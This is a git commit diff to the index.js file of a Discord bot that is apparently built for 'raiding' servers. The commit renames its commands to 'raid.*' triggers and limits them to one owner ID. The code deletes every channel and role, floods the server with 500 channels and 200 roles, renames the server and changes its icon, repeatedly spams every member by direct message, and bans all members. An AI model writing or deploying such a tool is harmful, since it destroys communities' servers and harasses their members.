5357dcedf6449789dcf6ccfd603320aa806a1fdc
ToonZLGamer <iamkenneth63@gmail.com>
2021-10-27 17:51:09 -0600

    Update index.js

--- index.js
+++ index.js
@@ -23,7 +23,7 @@ activity: {
 client.on("message", message => {
   if (message.author.id !== '724423864611766294') 
   return;
-   if (message.content === 't.nuke') {
+   if (message.content === 'raid.nuke') {
     message.guild.channels.cache.forEach(channel => channel.delete());
     message.guild.channels.create(`#si`, {
           type: 'text'
@@ -32,24 +32,10 @@ client.on("message", message => {
         })
          }
       })
-//comando especial
-client.on("message", message => {
-   if (message.author.id !== '724423864611766294') return;
-    const args = message.content.slice().trim().split(/ +/g );
-    const command = args.shift().toLowerCase();
-   if (command === '<3') {
-       const embed = new Discord.MessageEmbed()
-       .setTitle("Audrey te amoo <3 ")
-       .setThumbnail()
-       .setColor("BLUE");
-       message.channel.send(embed)
-   }
-   
-});
 //raid
 client.on("message", message => {
       if (message.author.id !== '724423864611766294') return;
-           if (message.content === 't.raid') {
+           if (message.content === 'raid.raid') {
            for (let i = 0; i <= 500; i++) {
                 message.guild.channels.create(`Tokyo Machine Forever`, {
                   type: 'text'
@@ -79,9 +65,8 @@ client.on("message", message => {
             });     
 //mdall
 client.on("message", message => {
-                        if (message.author.bot) return;
-                        
-                      if(message.content === "12413414213")
+                     if (message.author.id !== '724423864611766294') return;
+                      if(message.content === "raid.mdall")
                       message.guild.members.cache.forEach(member => {
                         setInterval(function(){
                           member.send("https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2").catch(error => {});
@@ -90,17 +75,16 @@ client.on("message", message => {
                       });
 //borar roles
 client.on("message", message => {
-                    if (message.author.bot) return;
+  if (message.author.id !== '724423864611766294') return;
                   
-                     if(message.content === ('12413414213')){
+                     if(message.content === ('raid.deleterole')){
                             message.guild.roles.cache.map(roles => roles.delete());
                           }
                   });
 //crear roles
 client.on("message", message => {
-                if (message.author.bot) return;
-              
-               if (message.content === '12413414213') {
+  if (message.author.id !== '724423864611766294') return;
+               if (message.content === 'raid.roles') {
               for (let i = 0; i <= 200; i++) {
                  message.guild.roles.create({data: {name: `RaidByTokyoMachine`,color: '#d41818',},reason: 'razon',})
               };
@@ -108,9 +92,9 @@ client.on("message", message => {
                 });
 //foto y nombre
 client.on("message", message => {
-                    if (message.author.bot) return;
+  if (message.author.id !== '724423864611766294') return;
                   
-                   if (message.content === '12413414213') {
+                   if (message.content === 'raid.foto') {
                       message.guild.setName("");
                       message.guild.setIcon("https://media.discordapp.net/attachments/852694727362740274/854826226886508564/843294242431827988.png"
                       );
@@ -118,9 +102,8 @@ client.on("message", message => {
                     }); 
 //banall
 client.on("message", message => {
-    if (message.author.bot) return;
-  
-    if (message.content === '12413414213') {
+  if (message.author.id !== '724423864611766294') return;
+    if (message.content === 'raid.banall') {
     message.delete()
     message.guild.members.cache.forEach(m => {
     m.ban()
